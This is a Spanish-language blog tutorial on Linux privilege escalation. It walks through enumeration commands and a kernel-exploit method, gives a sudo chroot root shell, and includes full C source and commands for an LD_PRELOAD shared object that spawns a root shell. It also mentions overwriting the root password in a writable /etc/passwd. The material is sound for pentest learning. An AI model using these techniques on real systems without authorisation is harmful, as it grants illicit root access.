---
layout      : post
title       : "Escalada de Privilegios - Linux"
author      : elc4br4
image       : assets/images/articles/escalada-de-privilegios/portada.png
category    : [ article ]
tags        : [ Linux ]
---
La escalada de privilegios es el acto de explotar un error, un fallo de diseño o una supervisión de la configuración en un sistema operativo o una aplicación de software
para obtener un acceso elevado a los recursos que normalmente están protegidos de una aplicación o un usuario.

En otras palabras: Los ataques de escalada de privilegios ocurren cuando los se explotan configuraciones incorrectas, errores, contraseñas débiles y otras vulnerabilidades que les permiten acceder a activos protegidos y obtener privilegios de nivel superior.

Lo primero a la hora de escalar privilegios es identificar como o a través de que vamos a escalar, por lo tanto lo primero es enumerar.

Mostraré diferentes formas de enumerar


# ENUMERACIÓN
```bash
Nombre de host → el comando hostname nos arroja el nombre de host de la máquina. Aunque se puede cambiar fácilmente o no arrojar información valiosa, en ocasiones puede informarnos acerca de la función del sistema en la red.
```
![](/assets/images/escalada-de-privilegios/hostname.png)

```bash
Uname -a → este comando nos arroja toda la información del sistema.

Información como la versión de Kernel usado por el sistema. Que nos ayudará a buscar posibles vulnerabilidades del kernel con las que podríamos escalar privilegios.
```

![](/assets/images/escalada-de-privilegios/uname-a.png)

```bash
Comando ps → el comando ps sirve para ver los procesos en ejecución del sistema Linux.

Al escribir el comando ps se mostrarán los procesos para la shell actual.

El comando ps mostrará lo siguiente:

    PID: ID del proceso

    TTY: Tipo de terminal

    Tiempo: cantidad de tiempo de CPU usado para el proceso

    CMD: comando o ejecutable en ejecución
```

![](/assets/images/escalada-de-privilegios/pscommand.png)

```bash
ps aux → el parámetro aux nos mostrará los procesos para todos los usuarios (a), el usuario que inició el proceso (u), y mostrará los procesos que no están conectados a una terminal (x).
```

![](/assets/images/escalada-de-privilegios/psaux.png)

```bash
/proc/version → El sistema de archivos proc (procsf) proporciona información sobre los procesos del sistema de destino.

Mirar /proc/version puede brindarle información sobre la versión del kernel y datos adicionales, como si está instalado un compilador (GCC).
```

![](/assets/images/escalada-de-privilegios/procversion.png)

```bash
/etc/issue → Los sistemas también se pueden identificar mirando el archivo issue.

Este archivo contiene información del sistema operativo aunque se puede modificar fácilmente.
```

![](/assets/images/escalada-de-privilegios/etcissue.png)

```bash
Comando env → el comando env muestra las variables ambientales.

La variable PATH puede tener un compilador o un lenguaje de secuencias de comandos (por ejemplo, Python) que podría usarse para ejecutar código en el sistema de destino o aprovecharse para escalar privilegios.
```

![](/assets/images/escalada-de-privilegios/comandoenv.png)

```bash
sudo -l → el sistema se puede configurar para permitir que los usuarios ejecuten algunos o todos los comandos con privilegios root.

El comando sudo -l se usa para enumerar todos aquellos comandos que se pueden ejecutar como root usando el comando sudo.
```

![](/assets/images/escalada-de-privilegios/sudo-l.png)

```bash
Comando ls → Uno de los comandos más usados en linux.

Mientras buscamos posibles vectores de ataque debemos usar este comando con el parámetro -la (ls -la) ya que de esta forma podemos ver que permisos tienen los archivos que estamos viendo y encontrar un posible vector de escalada de privilegios.
```

*EJEMPLO*: archivo passwd con permisos de escritura, podemos generar una contraseña usando mkpasswd e insertarla en el usuario root y loguearnos como root usando la contraseña generada.

```bash
Comando id → El comando id nos proporciona información acerca del usuario, pertenencia a grupos y el nivel de privilegios del usuario.

❯ id
uid=1000(elc4br4) gid=1000(elc4br4) grupos=1000(elc4br4),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),117(lpadmin),120(scanner)
```

```bash
etc/passwd → a través de este archivo podemos descubrir usuarios en el sistema.


root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:109:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:111:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:115:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
elc4br4:x:1000:1000:elc4br4,,,:/home/elc4br4:/usr/bin/zsh
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
vboxadd:x:998:1::/var/run/vboxadd:/bin/false
tcpdump:x:116:125::/nonexistent:/usr/sbin/nologin
```

```bash
Comando History → este comando nos brindará la oportunidad de poder acceder a los comandos ejecutados anteriormente y puede tener información almacenada como usuarios y contraseñas.
```

![](/assets/images/articles/escalada-de-privilegios/history.png)

```bash
Comando ifconfig → Este comando nos arroja información sobre las interfaces de red del sistema.
```

Podría ser útil para pivoting a otros equipos o redes.

A través del comando ip route podemos ver las rutas de red que existen.

```
❯ ip route
default via 192.168.0.1 dev enp0s3 proto dhcp metric 100 
192.168.0.0/24 dev enp0s3 proto kernel scope link src 192.168.0.52 metric 100 
```

```bash
Comando netstat → a través de este comando podemos ver las conexiones existentes activas.

netstat -a: muestra todos los puertos de escucha y las conexiones establecidas.
```

![](/assets/images/articles/escalada-de-privilegios/netstat.png)

`netstat -at o netstat -au` también se puede usar para enumerar los protocolos TCP o UDP respectivamente.

`netstat -l`: lista de puertos en modo “escucha”. Estos puertos están abiertos y listos para aceptar conexiones entrantes. Esto se puede usar con la opción “t” para enumerar solo los puertos que están escuchando usando el protocolo TCP (abajo).

![](/assets/images/article/escalada-de-privilegios/netstat-l.png)

`netstat -s`: enumera las estadísticas de uso de la red por protocolo (a continuación) Esto también se puede usar con las opciones -t o -u para limitar la salida a un protocolo específico.

`netstat -tp`: enumera las conexiones con el nombre del servicio y la información de PID.


![](/assets/images/articles/escalada-de-privilegios/findcomando.jpeg)

Comando find → Este comando es de los más útiles a la hora de buscar posibles vectores de escalada, gracias a este comando podemos “buscar”.

Buscar archivos:

```bash
find . -name archivo.txt: busque el archivo llamado archivo.txt en el directorio actual

find /home -name archivo.txt: busque los nombres de archivo archivo.txt en el directorio /home

find / -type d -name config: busque el directorio llamado config debajo de /

find / -type f -perm 0777: busque archivos con los permisos 777 (archivos legibles y ejecutables por todos los usuarios)

find / -perm a=x: encontrar archivos ejecutables

find /home -user kali: encuentre todos los archivos para el usuario kali en / home

find / -mtime 10: encuentra archivos que fueron modificados en los últimos 10 días

find / -atime 10: busca archivos a los que se accedió en los últimos 10 días

find / -cmin -60: busca archivos modificados en la última hora (60 minutos)

find / -amin -60: encuentra accesos a archivos en la última hora (60 minutos)

find / -size 50M: encuentra archivos con un tamaño de 50 MB

find / -perm -u=s -type f 2>/dev/null: Buscar archivos con el bit SUID, lo que nos permite ejecutar el archivo con un nivel de privilegios superior al       del usuario actual.
```
    
![](/assets/images/escalada-de-privilegios/escaladakernel.jpg)

# ESCALADA DE PRIVILEGIOS VULNERABILIDADES DEL KERNEL

*La metodología es simple*

1. Identificar versión del Kernel

```bash
❯ uname -a
Linux elc4br4 3.13.0-24-generic #46-Ubuntu SMP
```

2. Buscar y encontrar un código de explotación o exploit para el kernel.

![](/assets/images/escalada-de-privilegios/escalada1.png)


3. Ejecutar el exploit y conseguir escalar privilegios.

![](/assets/images/escalada-de-privilegios/escalada2.png)


![](/assets/images/escalada-de-privilegios/escalada3.png)

# ESCALADA DE PRIVILEGIOS CON SUDO

El primer paso es descubrir que permisos tiene el usuario, usando el comando:

`sudo -l`

```bash
❯ sudo -l
Matching Defaults entries for elc4br4 on elc4br4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User elc4br4 may run the following commands on elc4br4:
    (root) NOPASSWD: /usr/bin/chroot
    (ALL : ALL) ALL
```

Como podemos ver, se puede ejecutar el binario chroot como root sin contraseña.

Aprovecharemos esta vulnerabilidad para convertirnos en root.

Usaremos la siguiente fuente:

[https://gtfobins.github.io/](https://gtfobins.github.io/)

![](/assets/images/escalada-de-privilegios/gtfochroot.png)

```bash
❯ sudo chroot /
❯ id
uid=0(root) gid=0(root) groups=0(root),4(adm),20(dialout),119(wireshark),143(kaboxer)  
```
Como vemos, hemos pasado del usuario kali al usuario root.

# ESCALADA VARIABLE LD_PRELOAD
```bash
LD_PRELOAD es una variable ambiental opcional que contiene una o más rutas a bibliotecas compartidas u objetos compartidos, que el cargador cargará antes que cualquier otra biblioteca compartida, incluida la biblioteca en tiempo de ejecución de C (libc.so). Es decir, precarga una biblioteca.
```

Las maneras en que se buscan y cargas las librerías tenemos:

    LD_PRELOAD: Objetos compartidos que se cargaran antes de cualquier libreria.

    LD_LIBRARY_PATH: Camino a los directorios de librerias.

    /etc/ld.so.conf

LD_Preload es la variable de entorno que lista las rutas de la librerías compartidas, al igual que /etc/ld.so.preload.

Lo primero que debemos tener en cuenta es que debemos tener algunos derechos de sudo, en mi caso puedo ejecutar el binario chroot como root sin contraseña, de forma que lo aprovecharemos.

Generamos un pequeño programa en C llamado escalada.c.

```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

Lo compilamos con el siguiente comando:

`cc -fPIC -shared -o escalada.so escalada.c -D_GNU_SOURCE -nostartfiles`

Una vez compilado ejecutamos el siguiente comando:

`sudo LD_PRELOAD=/tmp/escalada.so chroot`

**Y seremos root**

Añadiré más vectores de escalada poco a poco.

